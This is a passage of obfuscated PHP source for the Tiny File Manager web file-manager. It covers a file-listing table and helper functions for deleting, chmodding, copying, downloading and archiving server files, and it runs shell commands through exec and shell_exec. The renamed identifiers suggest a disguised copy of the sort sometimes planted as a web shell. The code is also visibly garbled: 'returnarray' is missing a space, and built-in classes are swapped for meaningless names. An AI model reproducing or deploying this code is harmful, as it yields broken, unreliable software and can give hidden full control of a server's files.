                            <input type="checkbox" class="custom-control-input" id="js-select-all-items" onclick="checkbox_toggle()">
                            <label class="custom-control-label" for="js-select-all-items"></label>
                        </div>
                    </th><?php endif;?>
                <th><?php echo c3a('Name')?></th>
                <th><?php echo c3a('Size')?></th>
                <th><?php echo c3a('Modified')?></th>
                <?php if(!FM_IS_WIN&&!$o5f):?>
                    <th><?php echo c3a('Perms')?></th>
                    <th><?php echo c3a('Owner')?></th><?php endif;?>
                <th><?php echo c3a('Actions')?></th>
            </tr>
            </thead>
            <?php if($gcf!==false){?>
                <tr><?php if(!FM_READONLY):?>
                    <td class="nosort"></td><?php endif;?>
                    <td class="border-0" data-sort><a href="?p=<?php echo urlencode($gcf)?>"><i class="fa fa-chevron-circle-left go-back"></i> ..</a></td>
                    <td class="border-0" data-order></td>
                    <td class="border-0" data-order></td>
                    <td class="border-0"></td>
                    <?php if(!FM_IS_WIN&&!$o5f){?>
                        <td class="border-0"></td>
                        <td class="border-0"></td>
                    <?php }?>
                </tr>
                <?php }$tf8=3399;foreach($md1 as $pae){$nf9=is_link($m70.'/'.$pae);$gfa=$nf9?'icon-link_folder':'fa fa-folder-o';$vfb=filemtime($m70.'/'.$pae);$zfc=date(FM_DATETIME_FORMAT,$vfb);$cfd=strtotime(date("F d Y H:i:s.",$vfb));$ddc="";$rdd=c3a('Folder');$pfe=substr(decoct(fileperms($m70.'/'.$pae)),-4);if(function_exists('posix_getpwuid')&&function_exists('posix_getgrgid')){$wff=posix_getpwuid(fileowner($m70.'/'.$pae));$p100=posix_getgrgid(filegroup($m70.'/'.$pae));if($wff===false){$wff=array('name'=>'?');}if($p100===false){$p100=array('name'=>'?');}}else{$wff=array('name'=>'?');$p100=array('name'=>'?');}?>
                <tr>
                    <?php if(!FM_READONLY):?>
                        <td class="custom-checkbox-td">
                        <div class="custom-control custom-checkbox">
                            <input type="checkbox" class="custom-control-input" id="<?php echo $tf8 ?>" name="file[]" value="<?php echo g1c($pae)?>">
                            <label class="custom-control-label" for="<?php echo $tf8 ?>"></label>
                        </div>
                        </td><?php endif;?>
                    <td data-sort=<?php echo s20(g1c($pae))?>>
                        <div class="filename"><a href="?p=<?php echo urlencode(trim(FM_PATH.'/'.$pae,'/'))?>"><i class="<?php echo $gfa ?>"></i> <?php echo s20(g1c($pae))?>
                            </a><?php echo($nf9?' &rarr; <i>'.readlink($m70.'/'.$pae).'</i>':'')?></div>
                    </td>
                    <td data-order="a-<?php echo str_pad($ddc,18,"0",STR_PAD_LEFT);?>">
                        <?php echo $rdd;?>
                    </td>
                    <td data-order="a-<?php echo $cfd;?>"><?php echo $zfc ?></td>
                    <?php if(!FM_IS_WIN&&!$o5f):?>
                        <td><?php if(!FM_READONLY):?><a title="Change Permissions" href="?p=<?php echo urlencode(FM_PATH)?>&amp;chmod=<?php echo urlencode($pae)?>"><?php echo $pfe ?></a><?php else:?><?php echo $pfe ?><?php endif;?>
                        </td>
                        <td><?php echo $wff['name'].':'.$p100['name']?></td>
                    <?php endif;?>
                    <td class="inline-actions"><?php if(!FM_READONLY):?>
                            <a title="<?php echo c3a('Delete')?>" href="?p=<?php echo urlencode(FM_PATH)?>&amp;del=<?php echo urlencode($pae)?>" onclick="confirmDailog(event, '1028','<?php echo c3a('Delete').' '.c3a('Folder');?>','<?php echo urlencode($pae)?>', this.href);"> <i class="fa fa-trash-o" aria-hidden="true"></i></a>
                            <a title="<?php echo c3a('Rename')?>" href="#" onclick="rename('<?php echo g1c(addslashes(FM_PATH))?>', '<?php echo g1c(addslashes($pae))?>');return false;"><i class="fa fa-pencil-square-o" aria-hidden="true"></i></a>
                            <a title="<?php echo c3a('CopyTo')?>..." href="?p=&amp;copy=<?php echo urlencode(trim(FM_PATH.'/'.$pae,'/'))?>"><i class="fa fa-files-o" aria-hidden="true"></i></a>
                        <?php endif;?>
                        <a title="<?php echo c3a('DirectLink')?>" href="<?php echo g1c(FM_ROOT_URL.(FM_PATH!=''?'/'.FM_PATH:'').'/'.$pae.'/')?>" target="_blank"><i class="fa fa-link" aria-hidden="true"></i></a>
                    </td>
                </tr>
                <?php flush();$tf8++;}$c101=6070;foreach($yad as $pae){$nf9=is_link($m70.'/'.$pae);$gfa=$nf9?'fa fa-file-text-o':c22($m70.'/'.$pae);$vfb=filemtime($m70.'/'.$pae);$zfc=date(FM_DATETIME_FORMAT,$vfb);$cfd=strtotime(date("F d Y H:i:s.",$vfb));$ddc=u18($m70.'/'.$pae);$rdd=w19($ddc);$p102='?p='.urlencode(FM_PATH).'&amp;view='.urlencode($pae);$pf6+=$ddc;$pfe=substr(decoct(fileperms($m70.'/'.$pae)),-4);if(function_exists('posix_getpwuid')&&function_exists('posix_getgrgid')){$wff=posix_getpwuid(fileowner($m70.'/'.$pae));$p100=posix_getgrgid(filegroup($m70.'/'.$pae));if($wff===false){$wff=array('name'=>'?');}if($p100===false){$p100=array('name'=>'?');}}else{$wff=array('name'=>'?');$p100=array('name'=>'?');}?>
                <tr>
                    <?php if(!FM_READONLY):?>
                        <td class="custom-checkbox-td">
                        <div class="custom-control custom-checkbox">
                            <input type="checkbox" class="custom-control-input" id="<?php echo $c101 ?>" name="file[]" value="<?php echo g1c($pae)?>">
                            <label class="custom-control-label" for="<?php echo $c101 ?>"></label>
                        </div>
                        </td><?php endif;?>
                    <td data-sort=<?php echo g1c($pae)?>>
                        <div class="filename">
                        <?php if(in_array(strtolower(pathinfo($pae,PATHINFO_EXTENSION)),array('gif','jpg','jpeg','png','bmp','ico','svg','webp','avif'))):?>
                                <?php $x103=g1c(FM_ROOT_URL.(FM_PATH!=''?'/'.FM_PATH:'').'/'.$pae);?>
                                <a href="<?php echo $p102 ?>" data-preview-image="<?php echo $x103 ?>" title="<?php echo g1c($pae)?>">
                           <?php else:?>
                                <a href="<?php echo $p102 ?>" title="<?php echo $pae ?>">
                            <?php endif;?>
                                    <i class="<?php echo $gfa ?>"></i> <?php echo s20(g1c($pae))?>
                                </a>
                                <?php echo($nf9?' &rarr; <i>'.readlink($m70.'/'.$pae).'</i>':'')?>
                        </div>
                    </td>
                    <td data-order="b-<?php echo str_pad($ddc,18,"0",STR_PAD_LEFT);?>"><span title="<?php printf('%s bytes',$ddc)?>">
                        <?php echo $rdd;?>
                        </span></td>
                    <td data-order="b-<?php echo $cfd;?>"><?php echo $zfc ?></td>
                    <?php if(!FM_IS_WIN&&!$o5f):?>
                        <td><?php if(!FM_READONLY):?><a title="<?php echo 'Change Permissions' ?>" href="?p=<?php echo urlencode(FM_PATH)?>&amp;chmod=<?php echo urlencode($pae)?>"><?php echo $pfe ?></a><?php else:?><?php echo $pfe ?><?php endif;?>
                        </td>
                        <td><?php echo g1c($wff['name'].':'.$p100['name'])?></td>
                    <?php endif;?>
                    <td class="inline-actions">
                        <?php if(!FM_READONLY):?>
                            <a title="<?php echo c3a('Delete')?>" href="?p=<?php echo urlencode(FM_PATH)?>&amp;del=<?php echo urlencode($pae)?>" onclick="confirmDailog(event, 1209, '<?php echo c3a('Delete').' '.c3a('File');?>','<?php echo urlencode($pae);?>', this.href);"> <i class="fa fa-trash-o"></i></a>
                            <a title="<?php echo c3a('Rename')?>" href="#" onclick="rename('<?php echo g1c(addslashes(FM_PATH))?>', '<?php echo g1c(addslashes($pae))?>');return false;"><i class="fa fa-pencil-square-o"></i></a>
                            <a title="<?php echo c3a('CopyTo')?>..."
                               href="?p=<?php echo urlencode(FM_PATH)?>&amp;copy=<?php echo urlencode(trim(FM_PATH.'/'.$pae,'/'))?>"><i class="fa fa-files-o"></i></a>
                        <?php endif;?>
                        <a title="<?php echo c3a('DirectLink')?>" href="<?php echo g1c(FM_ROOT_URL.(FM_PATH!=''?'/'.FM_PATH:'').'/'.$pae)?>" target="_blank"><i class="fa fa-link"></i></a>
                        <a title="<?php echo c3a('Download')?>" href="?p=<?php echo urlencode(FM_PATH)?>&amp;dl=<?php echo urlencode($pae)?>" onclick="confirmDailog(event, 1211, '<?php echo c3a('Download');?>','<?php echo urlencode($pae);?>', this.href);"><i class="fa fa-download"></i></a>
                    </td>
                </tr>
                <?php flush();$c101++;}if(empty($md1)&&empty($yad)){?>
                <tfoot>
                    <tr><?php if(!FM_READONLY):?>
                            <td></td><?php endif;?>
                        <td colspan="<?php echo(!FM_IS_WIN&&!$o5f)?'6':'4' ?>"><em><?php echo c3a('Folder is empty')?></em></td>
                    </tr>
                </tfoot>
                <?php }else{?>
                <tfoot>
                    <tr>
                        <td class="gray" colspan="<?php echo(!FM_IS_WIN&&!$o5f)?(FM_READONLY?'6':'7'):(FM_READONLY?'4':'5')?>">
                            <?php echo c3a('FullSize').': <span class="badge text-bg-light border-radius-0">'.w19($pf6).'</span>' ?>
                            <?php echo c3a('File').': <span class="badge text-bg-light border-radius-0">'.$gf4.'</span>' ?>
                            <?php echo c3a('Folder').': <span class="badge text-bg-light border-radius-0">'.$kf5.'</span>' ?>
                        </td>
                    </tr>
                </tfoot>
                <?php }?>
        </table>
    </div>

    <div class="row">
        <?php if(!FM_READONLY):?>
        <div class="col-xs-12 col-sm-9">
            <ul class="list-inline footer-action">
                <li class="list-inline-item"> <a href="#/select-all" class="btn btn-small btn-outline-primary btn-2" onclick="select_all();return false;"><i class="fa fa-check-square"></i> <?php echo c3a('SelectAll')?> </a></li>
                <li class="list-inline-item"><a href="#/unselect-all" class="btn btn-small btn-outline-primary btn-2" onclick="unselect_all();return false;"><i class="fa fa-window-close"></i> <?php echo c3a('UnSelectAll')?> </a></li>
                <li class="list-inline-item"><a href="#/invert-all" class="btn btn-small btn-outline-primary btn-2" onclick="invert_all();return false;"><i class="fa fa-th-list"></i> <?php echo c3a('InvertSelection')?> </a></li>
                <li class="list-inline-item"><input type="submit" class="hidden" name="delete" id="a-delete" value="Delete" onclick="return confirm('<?php echo c3a('Delete selected files and folders?');?>')">
                    <a href="javascript:document.getElementById('a-delete').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-trash"></i> <?php echo c3a('Delete')?> </a></li>
                <li class="list-inline-item"><input type="submit" class="hidden" name="zip" id="a-zip" value="zip" onclick="return confirm('<?php echo c3a('Create archive?');?>')">
                    <a href="javascript:document.getElementById('a-zip').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-file-archive-o"></i> <?php echo c3a('Zip')?> </a></li>
                <li class="list-inline-item"><input type="submit" class="hidden" name="tar" id="a-tar" value="tar" onclick="return confirm('<?php echo c3a('Create archive?');?>')">
                    <a href="javascript:document.getElementById('a-tar').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-file-archive-o"></i> <?php echo c3a('Tar')?> </a></li>
                <li class="list-inline-item"><input type="submit" class="hidden" name="copy" id="a-copy" value="Copy">
                    <a href="javascript:document.getElementById('a-copy').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-files-o"></i> <?php echo c3a('Copy')?> </a></li>
            </ul>
        </div>
        <div class="col-3 d-none d-sm-block"><a href="https://tinyfilemanager.github.io" target="_blank" class="float-right text-muted">Tiny File Manager <?php echo VERSION;?></a></div>
        <?php else:?>
            <div class="col-12"><a href="https://tinyfilemanager.github.io" target="_blank" class="float-right text-muted">Tiny File Manager <?php echo VERSION;?></a></div>
        <?php endif;?>
    </div>
</form>

<?php d39();/**
 * It prints the css/js files into html
 * @param key The key of the external file to print.
 */ function m7($h104){global $i58;if(!array_key_exists($h104,$i58)){echo"<!-- EXTERNAL: MISSING KEY $h104 -->";return;}echo"$i58[$h104]";}/**
 * Verify CSRF TOKEN and remove after cerify
 * @param string $token
 * @return bool
 */ function z8($f105){if(hash_equals($_SESSION['token'],$f105)){return true;}return false;}/**
 * Delete  file or folder (recursively)
 * @param string $path
 * @return bool
 */ function n9($m70){if(is_link($m70)){return unlink($m70);}elseif(is_dir($m70)){$td0=scandir($m70);$u106=true;if(is_array($td0)){foreach($td0 as $u64){if($u64!='.'&&$u64!='..'){if(!n9($m70.'/'.$u64)){$u106=false;}}}}return($u106)?rmdir($m70):false;}elseif(is_file($m70)){return unlink($m70);}return false;}/**
 * Recursive chmod
 * @param string $path
 * @param int $filemode
 * @param int $dirmode
 * @return bool
 * @todo Will use in mass chmod
 */ function fa($m70,$j107,$f108){if(is_dir($m70)){if(!chmod($m70,$f108)){return false;}$td0=scandir($m70);if(is_array($td0)){foreach($td0 as $u64){if($u64!='.'&&$u64!='..'){if(!fa($m70.'/'.$u64,$j107,$f108)){return false;}}}}return true;}elseif(is_link($m70)){return true;}elseif(is_file($m70)){return chmod($m70,$j107);}return false;}/**
 * Check the file extension which is allowed or not
 * @param string $filename
 * @return bool
 */ function db($mb6){$d91=(FM_FILE_EXTENSION)?explode(',',FM_FILE_EXTENSION):false;$a92=pathinfo($mb6,PATHINFO_EXTENSION);$b93=($d91)?in_array($a92,$d91):true;return($b93)?true:false;}/**
 * Safely rename
 * @param string $old
 * @param string $new
 * @return bool|null
 */ function fc($yaf,$n9e){$b93=db($n9e);if(!is_dir($yaf)){if(!$b93)return false;}return(!file_exists($n9e)&&file_exists($yaf))?rename($yaf,$n9e):null;}/**
 * Copy file or folder (recursively).
 * @param string $path
 * @param string $dest
 * @param bool $upd Update files
 * @param bool $force Create folder with same names instead file
 * @return bool
 */ function wd($m70,$ba1,$q109=true,$f10a=true){if(is_dir($m70)){if(!te($ba1,$f10a)){return false;}$td0=scandir($m70);$u106=true;if(is_array($td0)){foreach($td0 as $u64){if($u64!='.'&&$u64!='..'){if(!wd($m70.'/'.$u64,$ba1.'/'.$u64)){$u106=false;}}}}return $u106;}elseif(is_file($m70)){return vf($m70,$ba1,$q109);}return false;}/**
 * Safely create folder
 * @param string $dir
 * @param bool $force
 * @return bool
 */ function te($u6e,$f10a){if(file_exists($u6e)){if(is_dir($u6e)){return $u6e;}elseif(!$f10a){return false;}unlink($u6e);}return mkdir($u6e,0777,true);}/**
 * Safely copy file
 * @param string $f1
 * @param string $f2
 * @param bool $upd Indicates if file should be updated with new content
 * @return bool
 */ function vf($s10b,$t10c,$q109){$q10d=filemtime($s10b);if(file_exists($t10c)){$r10e=filemtime($t10c);if($r10e>=$q10d&&$q109){return false;}}$u106=copy($s10b,$t10c);if($u106){touch($t10c,$q10d);}return $u106;}/**
 * Get mime type
 * @param string $file_path
 * @return mixed|string
 */ function x10($q72){if(function_exists('finfo_open')){$d10f=finfo_open(FILEINFO_MIME_TYPE);$v110=finfo_file($d10f,$q72);finfo_close($d10f);return $v110;}elseif(function_exists('mime_content_type')){return mime_content_type($q72);}elseif(!stristr(ini_get('disable_functions'),'shell_exec')){$u64=escapeshellarg($q72);$v110=shell_exec('file -bi '.$u64);return $v110;}else{return '--';}}/**
 * HTTP Redirect
 * @param string $url
 * @param int $code
 */ function f11($b8a,$h62=302){header('Location: '.$b8a,true,$h62);exit;}/**
 * Path traversal prevention and clean the url
 * It replaces (consecutive) occurrences of / and \\ with whatever is in DIRECTORY_SEPARATOR, and processes /. and /.. fine.
 * @param $path
 * @return string
 */ function c12($m70){$m70=str_replace(array('/','\\'),DIRECTORY_SEPARATOR,$m70);$c111=array_filter(explode(DIRECTORY_SEPARATOR,$m70),'strlen');$u112=array();foreach($c111 as $m113){if('.'==$m113)continue;if('..'==$m113){array_pop($u112);}else{$u112[]=$m113;}}return r5(DIRECTORY_SEPARATOR,$u112);}/**
 * Clean path
 * @param string $path
 * @return string
 */ function r13($m70,$p114=true){$m70=$p114?trim($m70):$m70;$m70=trim($m70,'\\/');$m70=str_replace(array('../','..\\'),'',$m70);$m70=c12($m70);if($m70=='..'){$m70='';}return str_replace('\\','/',$m70);}/**
 * Get parent path
 * @param string $path
 * @return bool|string
 */ function p14($m70){$m70=r13($m70);if($m70!=''){$f115=explode('/',$m70);if(count($f115)>1){$f115=array_slice($f115,0,-1);return r5('/',$f115);}return '';}return false;}function v15($q72){global $r4a,$w45,$y46;switch($r4a){case 'relative':returnarray('label'=>'Path','path'=>g1c(s20(str_replace($w45,'',$q72))));case 'host':$g116=str_replace($w45,'',$q72);returnarray('label'=>'Host Path','path'=>g1c(s20('/'.$y46.'/'.ltrim(str_replace('\\','/',$g116),'/'))));case 'full':default:returnarray('label'=>'Full Path','path'=>g1c(s20($q72)));}}/**
 * Check file is in exclude list
 * @param string $file
 * @return bool
 */ function e16($u64){$a92=strtolower(pathinfo($u64,PATHINFO_EXTENSION));if(isset($m4e)and sizeof($m4e)){unset($m4e);}$m4e=FM_EXCLUDE_ITEMS;if(version_compare(PHP_VERSION,'7.0.0','<')){$m4e=unserialize($m4e);}if(!in_array($u64,$m4e)&&!in_array("*.$a92",$m4e)){return true;}return false;}/**
 * get language translations from json file
 * @param int $tr
 * @return array
 */ function y17($o117){try{$xe7=@file_get_contents('translation.json');if($xe7!==FALSE){$e118=json_decode($xe7,TRUE);global $p61;foreach($e118["language"]as $h104=>$z119){$h62=$z119["code"];$p61[$h62]=$z119["name"];if($o117)$o117[$h62]=$z119["translation"];}return $o117;}}catch(Exception $f7d){echo $f7d;}}/**
 * @param string $file
 * Recover all file sizes larger than > 2GB.
 * Works on php 32bits and 64bits and supports linux
 * @return int|string
 */ function u18($u64){static $w11a;static $k11b;if(!isset($w11a)){$w11a=(strtoupper(substr(PHP_OS,0,3))=='WIN');}if(!isset($k11b)){$k11b=(strtoupper(substr(PHP_OS,0))=="DARWIN");}static $k11c;if(!isset($k11c)){$k11c=(function_exists('exec')&&!ini_get('safe_mode')&&@exec('echo EXEC')=='EXEC');}if($k11c){$y11d=escapeshellarg($u64);$w11e=($w11a)?"for %F in (\"$u64\") do @echo %~zF":($k11b?"stat -f%z $y11d":"stat -c%s $y11d");@exec($w11e,$f11f);if(is_array($f11f)&&ctype_digit($r120=trim(r5("\n",$f11f)))){return $r120;}}if($w11a&&class_exists("COM")){try{$q121=new p122('Scripting.FileSystemObject');$pae=$q121->t123(realpath($u64));$r120=$pae->$p98;}catch(Exception $f7d){$r120=null;}if(ctype_digit($r120)){return $r120;}}return filesize($u64);}/**
 * Get nice filesize
 * @param int $size
 * @return string
 */ function w19($r120){$r120=(float)$r120;$j124=array('B','KB','MB','GB','TB','PB','EB','ZB','YB');$b125=($r120>0)?floor(log($r120,1024)):0;$b125=($b125>(count($j124)-1))?(count($j124)-1):$b125;return sprintf('%s %s',round($r120/pow(1024,$b125),2),$j124[$b125]);}/**
 * Get total size of directory tree.
 *
 * @param  string $directory Relative or absolute directory name.
 * @return int Total number of bytes.
 */ function i1a($u126){$g127=0;$u126=realpath($u126);if($u126!==false&&$u126!=''&&file_exists($u126)){foreach(new d128(new v129($u126,FilesystemIterator::SKIP_DOTS))as $u64){$g127+=$u64->d12a();}}return $g127;}/**
 * Get info about zip archive
 * @param string $path
 * @return array|bool
 */ function m1b($m70,$a92){if($a92=='zip'&&function_exists('zip_open')){$l12b=@zip_open($m70);if($l12b){$oe6=array();while($r12c=@zip_read($l12b)){$vef=@zip_entry_name($r12c);$h12d=substr($vef,-1)=='/';$oe6[]=array('name'=>$vef,'filesize'=>@zip_entry_filesize($r12c),'compressed_size'=>@zip_entry_compressedsize($r12c),'folder'=>$h12d );}@zip_close($l12b);return $oe6;}}elseif($a92=='tar'&&class_exists('PharData')){$l12e=new rcc($m70);$oe6=array();foreach(new d128($l12e)as $u64){$v12f=$u64->w130();$vef=str_replace("phar://".$m70,'',$u64->g131());$vef=substr($vef,($v132=strpos($vef,'/'))!==false?$v132+1:0);$h12d=$v12f->z133();$l134=new w135($u64);$oe6[]=array('name'=>$vef,'filesize'=>$l134->d12a(),'compressed_size'=>$u64->v136(),'folder'=>$h12d);}return $oe6;}return false;}/**
 * Encode html entities
 * @param string $text
 * @return string
 */ function g1c($f137){return htmlspecialchars($f137,ENT_QUOTES,'UTF-8');}/**
 * Prevent XSS attacks
 * @param string $text
 * @return string
 */ function n1d($f137){return(strpbrk($f137,'/?%*:|"<>')===FALSE)?true:false;}/**
 * Save message in session
 * @param string $msg
 * @param string $status
 */ function j1e($n63,$i138='ok'){$_SESSION[FM_SESSION_ID]['message']=$n63;$_SESSION[FM_SESSION_ID]['status']=$i138;}/**
 * Check if string is in UTF-8
 * @param string $string
 * @return int
 */ function i1f($f139){return preg_match('//u',$f139);}/**
 * Convert file name to UTF-8 in Windows
 * @param string $filename
 * @return string
 */ function s20($mb6){if(FM_IS_WIN&&function_exists('iconv')){$mb6=iconv(FM_ICONV_INPUT_ENC,'UTF-8//IGNORE',$mb6);}return $mb6;}/**
 * @param $obj
 * @return array
 */ function m21($u13a){if(!is_object($u13a)&&!is_array($u13a)){return $u13a;}if(is_object($u13a)){$u13a=get_object_vars($u13a);}return array_map('fm_object_to_array',$u13a);}/**
 * Get CSS classname for file
 * @param string $path
 * @return string
 */ function c22($m70){$a92=strtolower(pathinfo($m70,PATHINFO_EXTENSION));switch($a92){case 'ico':case 'gif':case 'jpg':case 'jpeg':case 'jpc':case 'jp2':case 'jpx':case 'xbm':case 'wbmp':case 'png':case 'bmp':case 'tif':case 'tiff':case 'webp':case 'avif':case 'svg':$gfa='fa fa-picture-o';break;case 'passwd':case 'ftpquota':case 'sql':case 'js':case 'ts':case 'jsx':case 'tsx':case 'hbs':case 'json':case 'sh':case 'config':case 'twig':case 'tpl':case 'md':case 'gitignore':case 'c':case 'cpp':case 'cs':case 'py':case 'rs':case 'map':case 'lock':case 'dtd':$gfa='fa fa-file-code-o';break;case 'txt':case 'ini':case 'conf':case 'log':case 'htaccess':case 'yaml':case 'yml':case 'toml':case 'tmp':case 'top':case 'bot':case 'dat':case 'bak':case 'htpasswd':case 'pl':$gfa='fa fa-file-text-o';break;case 'css':case 'less':case 'sass':case 'scss':$gfa='fa fa-css3';break;case 'bz2':case 'zip':case 'rar':case 'gz':case 'tar':case '7z':case 'xz':$gfa='fa fa-file-archive-o';break;case 'php':case 'php4':case 'php5':case 'phps':case 'phtml':$gfa='fa fa-code';break;case 'htm':case 'html':case 'shtml':case 'xhtml':$gfa='fa fa-html5';break;case 'xml':case 'xsl':$gfa='fa fa-file-excel-o';break;case 'wav':case 'mp3':case 'mp2':case 'm4a':case 'aac':case 'ogg':case 'oga':case 'wma':case 'mka':case 'flac':case 'ac3':case 'tds':$gfa='fa fa-music';break;case 'm3u':case 'm3u8':case 'pls':case 'cue':case 'xspf':$gfa='fa fa-headphones';break;case 'avi':case 'mpg':case 'mpeg':case 'mp4':case 'm4v':case 'flv':case 'f4v':case 'ogm':case 'ogv':case 'mov':case 'mkv':case '3gp':case 'asf':case 'wmv':case 'webm':$gfa='fa fa-file-video-o';break;case 'eml':case 'msg':$gfa='fa fa-envelope-o';break;case 'xls':case 'xlsx':case 'ods':$gfa='fa fa-file-excel-o';break;case 'csv':$gfa='fa fa-file-text-o';break;case 'bak':case 'swp':$gfa='fa fa-clipboard';break;case 'doc':case 'docx':case 'odt':$gfa='fa fa-file-word-o';break;case 'ppt':case 'pptx':$gfa='fa fa-file-powerpoint-o';break;case 'ttf':case 'ttc':case 'otf':case 'woff':case 'woff2':case 'eot':case 'fon':$gfa='fa fa-font';break;case 'pdf':$gfa='fa fa-file-pdf-o';break;case 'psd':case 'ai':case 'eps':case 'fla':case 'swf':$gfa='fa fa-file-image-o';break;case 'exe':case 'msi':$gfa='fa fa-file-o';break;case 'bat':$gfa='fa fa-terminal';break;default:$gfa='fa fa-info-circle';}return $gfa;}/**
 * Get image files extensions
 * @return array
 */ function t23(){returnarray('ico','gif','jpg','jpeg','jpc','jp2','jpx','xbm','wbmp','png','bmp','tif','tiff','psd','svg','webp','avif');}/**
 * Get video files extensions
 * @return array
 */ function l24(){returnarray('avi','webm','wmv','mp4','m4v','ogm','ogv','mov','mkv');}/**
 * Get audio files extensions
 * @return array
 */ function d25(){returnarray('wav','mp3','ogg','m4a');}/**
 * Get text file extensions
 * @return array
 */ function y26(){returnarray('txt','css','ini','conf','log','htaccess','passwd','ftpquota','sql','js','ts','jsx','tsx','mjs','json','sh','config','php','php4','php5','phps','phtml','htm','html','shtml','xhtml','xml','xsl','m3u','m3u8','pls','cue','bash','vue','eml','msg','csv','bat','twig','tpl','md','gitignore','less','sass','scss','c','cpp','cs','py','go','zsh','swift','map','lock','dtd','svg','asp','aspx','asx','asmx','ashx','jsp','jspx','cgi','dockerfile','ruby','yml','yaml','toml','vhost','scpt','applescript','csx','cshtml','c++','coffee','cfm','rb','graphql','mustache','jinja','http','handlebars','java','es','es6','markdown','wiki','tmp','top','bot','dat','bak','htpasswd','pl');}/**
 * Get mime types of text files
 * @return array
 */ function j27(){returnarray('application/xml','application/javascript','application/x-javascript','image/svg+xml','message/rfc822','application/json',);}/**
 * Get file names of text files w/o extensions
 * @return array
 */ function l28(){returnarray('license','readme','authors','contributors','changelog',);}/**
 * Get online docs viewer supported files extensions
 * @return array
 */ function d29(){returnarray('doc','docx','xls','xlsx','pdf','ppt','pptx','ai','psd','dxf','xps','rar','odt','ods');}/**
 * It returns the mime type of a file based on its extension.
 * @param extension The file extension of the file you want to get the mime type for.
 * @return string|string[] The mime type of the file.
 */ function t2a($a13b){$t13c['swf']='application/x-shockwave-flash';$t13c['pdf']='application/pdf';$t13c['exe']='application/octet-stream';$t13c['zip']='application/zip';$t13c['doc']='application/msword';$t13c['xls']='application/vnd.ms-excel';$t13c['ppt']='application/vnd.ms-powerpoint';$t13c['gif']='image/gif';$t13c['png']='image/png';$t13c['jpeg']='image/jpg';$t13c['jpg']='image/jpg';$t13c['webp']='image/webp';$t13c['avif']='image/avif';$t13c['rar']='application/rar';$t13c['ra']='audio/x-pn-realaudio';$t13c['ram']='audio/x-pn-realaudio';$t13c['ogg']='audio/x-pn-realaudio';$t13c['wav']='video/x-msvideo';$t13c['wmv']='video/x-msvideo';$t13c['avi']='video/x-msvideo';$t13c['asf']='video/x-msvideo';$t13c['divx']='video/x-msvideo';$t13c['mp3']='audio/mpeg';$t13c['mp4']='audio/mpeg';$t13c['mpeg']='video/mpeg';$t13c['mpg']='video/mpeg';$t13c['mpe']='video/mpeg';$t13c['mov']='video/quicktime';$t13c['swf']='video/quicktime';$t13c['3gp']='video/quicktime';$t13c['m4a']='video/quicktime';$t13c['aac']='video/quicktime';$t13c['m3u']='video/quicktime';$t13c['php']=['application/x-php'];$t13c['html']=['text/html'];$t13c['txt']=['text/plain'];if(empty($t13c[$a13b])){$t13c[$a13b]=['application/octet-stream'];}return $t13c[$a13b];}/**
 * This function scans the files and folder recursively, and return matching files
 * @param string $dir
 * @param string $filter
 * @return array|null
 */ function t2b($u6e='',$x13d=''){$m70=FM_ROOT_PATH.'/'.$u6e;if($m70){$g13e=new d128(new v129($m70));$q13f=new v140($g13e,"/(".$x13d.")/i");$yad=array();foreach($q13f as $u64){if(!$u64->u141()){$m76=$u64->m142();$i143=str_replace(FM_ROOT_PATH,'',$u64->l144());$yad[]=array("name"=>$m76,"type"=>"file","path"=>$i143,);}}return $yad;}}/**
* Parameters: downloadFile(File Location, File Name,
* max speed, is streaming
* If streaming - videos will show as videos, images as images
* instead of download prompt
* https://stackoverflow.com/a/13821992/1164642
*/ function f2c($y145,$m76,$e146=1024){if(connection_status()!=0)return(false);$a13b=pathinfo($m76,PATHINFO_EXTENSION);$b147=t2a($a13b);if(is_array($b147)){$b147=r5(' ',$b147);}$r120=filesize($y145);if($r120==0){j1e(c3a('Zero byte file! Aborting download'),'error');$e71=FM_PATH;f11(FM_SELF_URL.'?p='.urlencode($e71));return(false);}@ini_set('magic_quotes_runtime',0);$o95=fopen("$y145","rb");if($o95===false){j1e(c3a('Cannot open file! Aborting download'),'error');$e71=FM_PATH;f11(FM_SELF_URL.'?p='.urlencode($e71));return(false);}header('Content-Description: File Transfer');header('Expires: 0');header('Cache-Control: must-revalidate, post-check=0, pre-check=0');header('Pragma: public');header("Content-Transfer-Encoding: binary");header("Content-Type: $b147");$g148='attachment';if(strstr($_SERVER['HTTP_USER_AGENT'],"MSIE")){$m76=preg_replace('/\./','%2e',$m76,substr_count($m76,'.')-1);header("Content-Disposition: $g148;filename=\"$m76\"");}else{header("Content-Disposition: $g148;filename=\"$m76\"");}header("Accept-Ranges: bytes");$t149=0;if(isset($_SERVER['HTTP_RANGE'])){list($z14a,$t149)=explode("=",$_SERVER['HTTP_RANGE']);str_replace($t149,"-",$t149);$k14b=$r120-1;$h14c=$r120-$t149;header("HTTP/1.1 206 Partial Content");header("Content-Length: $h14c");header("Content-Range: bytes $t149$k14b/$r120");}else{$k14b=$r120-1;header("Content-Range: bytes 0-$k14b/$r120");header("Content-Length: ".$r120);}$y145=realpath($y145);while(ob_get_level())ob_end_clean();readfile($y145);fclose($o95);return((connection_status()==0)and!connection_aborted());}/**
 * If the theme is dark, return the text-white and bg-dark classes.
 * @return string the value of the  variable.
 */ function p2d(){$z14d='';if(FM_THEME=="dark"){$z14d="text-white bg-dark";}return $z14d;}/**
 * Class to work with zip files (using ZipArchive)
 */ class rc4{private $i14e;public function k2e(){$this->$e14f=new n150();}/**
     * Create archive with name $filename and files $files (RELATIVE PATHS!)
     * @param string $filename
     * @param array|string $files
     * @return bool
     */ public function d2f($mb6,$yad){$k84=$this->$e14f->m151($mb6,ZipArchive::CREATE);if($k84!==true){return false;}if(is_array($yad)){foreach($yad as $pae){$pae=r13($pae);if(!$this->i31($pae)){$this->$e14f->h152();return false;}}$this->$e14f->h152();return true;}else{if($this->i31($yad)){$this->$e14f->h152();return true;}return false;}}/**
     * Extract archive $filename to folder $path (RELATIVE OR ABSOLUTE PATHS)
     * @param string $filename
     * @param string $path
     * @return bool
     */ public function u30($mb6,$m70){$k84=$this->$e14f->m151($mb6);if($k84!==true){return false;}if($this->$e14f->pcd($m70)){$this->$e14f->h152();return true;}return false;}/**
     * Add file/folder to archive
     * @param string $filename
     * @return bool
